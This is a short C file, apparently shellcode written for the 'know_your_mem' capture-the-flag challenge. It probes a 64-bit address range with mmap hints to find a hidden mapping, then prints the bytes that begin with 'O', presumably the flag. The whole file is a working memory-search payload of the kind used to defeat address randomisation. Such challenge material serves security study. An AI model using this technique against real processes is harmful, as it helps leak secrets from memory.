#include <sys/mman.h>

// This is an example of turning simple C into raw shellcode.

// make shellcode.bin will compile to assembly
// make shellcode.bin.pkt will prepend the length so you can
//    ./know_your_mem < shellcode.bin.pkt

// Note: Right now the 'build' does not support .(ro)data
//       If you want them you'll have to adjust the Makefile.
//       They're not really necessary to solve this challenge though.


// From https://chromium.googlesource.com/linux-syscall-support/
static int my_errno = 0;
#define SYS_ERRNO my_errno
#include "linux-syscall-support/linux_syscall_support.h"


#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL


void *search(void *l, void *r, unsigned long unit) {
	if (unit < 0x1000) {
		if (*(char *)l == 'O') {
			sys_write(1, (char *)l, 0x100);
			return l;
		} else {
			return MAP_FAILED;
		}
	}

	for (void *addr_expect = l; addr_expect < r; addr_expect += unit) {
		void * const addr_result = sys_mmap(addr_expect, unit, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if (addr_result == addr_expect) {
			sys_munmap(addr_result, unit);
		} else {
			if (addr_result == MAP_FAILED) {
				return MAP_FAILED;
			} else {
				sys_munmap(addr_result, unit);
				void * const result = search(addr_expect, addr_expect + unit, unit >> 1);
				if (result != MAP_FAILED) {
					return result;
				}
			}
		}
	}

	return MAP_FAILED;
}

void _start()
{
	search((void *)ADDR_MIN, (void *)(ADDR_MIN * 2), 0x4000000UL);
}
